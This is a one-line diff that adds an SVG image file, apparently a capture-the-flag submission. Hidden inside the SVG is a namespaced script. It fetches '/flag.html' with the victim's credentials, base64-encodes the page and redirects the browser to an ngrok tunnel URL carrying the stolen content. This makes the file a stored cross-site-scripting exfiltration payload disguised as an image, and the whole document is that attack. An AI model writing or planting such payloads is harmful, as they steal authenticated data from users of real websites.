@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg"><g><x:script xmlns:x="http://www.w3.org/1999/xhtml">fetch("/flag.html", {credentials: "include"}).then(r => r.text()).then(d => window.location.href = `https://b850-2001-8f8-153b-359-d33c-361f-921-2a14.ngrok-free.app/?flag=${btoa(d)}`);</x:script><path fill="#FE6502" d="200 312.1h14v14h-14z"></path></g></svg>
